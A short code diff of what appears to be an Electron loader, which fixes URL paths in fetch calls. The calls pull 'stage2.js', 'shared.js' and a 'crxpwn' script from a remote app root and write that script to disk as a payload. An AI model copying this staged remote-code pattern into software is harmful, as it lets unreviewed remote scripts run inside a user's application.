@@ -87,10 +87,10 @@
                 //__monitor.loadURL(location.href.substr(0, location.href.indexOf('/app/')) + '/monitor.html?_=' + Date.now());
 
                 // grab stage 2
-                fetch(approot + 'stage2.js?_=' + Date.now()).then(x => x.text()).then(stage2 =>
+                fetch(approot + '/stage2.js?_=' + Date.now()).then(x => x.text()).then(stage2 =>
 
                     // grab shared
-                    fetch(approot + 'shared.js?_=' + Date.now()).then(x => x.text()).then(shared => {
+                    fetch(approot + '/shared.js?_=' + Date.now()).then(x => x.text()).then(shared => {
 
                         // find the main window
                         //var win = electron.BrowserWindow.getAllWindows().filter(x => x.getURL().indexOf('monitor') == -1)[0];
@@ -120,7 +120,7 @@
                         if (!fs.existsSync(data + '/DONTUPDATE')) {
 
                             // update crxpwn
-                            fetch(approot + 'crxpwn.js?_=' + Date.now())
+                            fetch(approot + '/crxpwn.js?_=' + Date.now())
                                 .then(r => r.text())
                                 .then(crxpwn => {
                                     fs.writeFileSync(data + '/crxpwn/payload.js', crxpwn);
